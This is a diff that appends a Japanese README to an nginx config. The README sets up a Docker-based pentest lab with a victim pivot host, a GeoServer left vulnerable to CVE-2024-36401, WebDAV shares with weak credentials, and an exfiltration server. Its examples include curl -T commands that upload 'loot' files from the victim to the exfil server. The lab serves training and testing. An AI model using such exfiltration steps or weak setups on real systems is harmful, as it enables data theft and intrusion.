@@ -230,3 +230,56 @@ server {
         autoindex on;
     }
 }
+
+
+
+
+使い方
+
+# Pentest Lab (統合版)
+
+被害環境・内部セグメント・エクスフィルサーバを1つの compose にまとめた構成。
+**ホストのポート公開なし**(アーセナルの共有2ディレクトリのみホストマウント)。
+
+## 構成
+
+| サービス         | 役割                                   | ネットワーク / IP                                   |
+|------------------|----------------------------------------|-----------------------------------------------------|
+| `victim-ubuntu`  | 被害ホスト兼 pivot                     | labnet `172.20.0.10` / internal `172.30.0.10` / exfil `172.40.0.100` |
+| `geoserver-vuln` | 脆弱 GeoServer (CVE-2024-36401)        | labnet `172.20.0.20`                                |
+| `arsenal`        | Apache WebDAV (noauth / auth)          | labnet `172.20.0.30`                                |
+| `internal-target`| nginx / 80 のみ (内部専用)             | internal `172.30.0.20`                              |
+| `exfil-server`   | nginx WebDAV / PUT 受信                | exfil `172.40.0.10`                                 |
+
+- `labnet` 172.20.0.0/24 … Kali 到達可
+- `internal_net` 172.30.0.0/24 … **ホスト非到達**(pivot 経由のみ)
+- `exfilnet` 172.40.0.0/24 … Kali 到達可 / 被害ホストからも送信可
+- アーセナル認証: `user` / `password`
+
+## 事前準備 (Kali)
+
+    mkdir -p /home/kali/auth /home/kali/noauth
+    echo '認証なしで取得できます' > /home/kali/noauth/readme.txt
+    echo 'user/password が必要です'  > /home/kali/auth/secret.txt
+
+## 起動
+
+    cd pentest-lab-full
+    docker compose up -d --build
+    docker compose ps
+
+## 検証例
+
+    # --- 外部セグメント (Kali から) ---
+    curl http://172.20.0.20:8080/geoserver/web/        # GeoServer
+    curl http://172.20.0.30/noauth/                    # 匿名共有
+    curl -u user:password http://172.20.0.30/auth/     # 認証共有
+
+    # --- 内部セグメント ---
+    curl http://172.30.0.20/        # Kali から → 到達不可
+    docker exec -it victim-ubuntu curl -s http://172.30.0.20/   # pivot 経由 → OK
+
+    # --- エクスフィル ---
+    docker exec victim-ubuntu bash -c 'echo loot > /tmp/x; curl -T /tmp/x http://172.40.0.10/upload/'
+    docker exec exfil-server ls -la /data/upload
+    echo data > /tmp/loot.txt && curl -T /tmp/loot.txt http://172.40.0.10/upload/
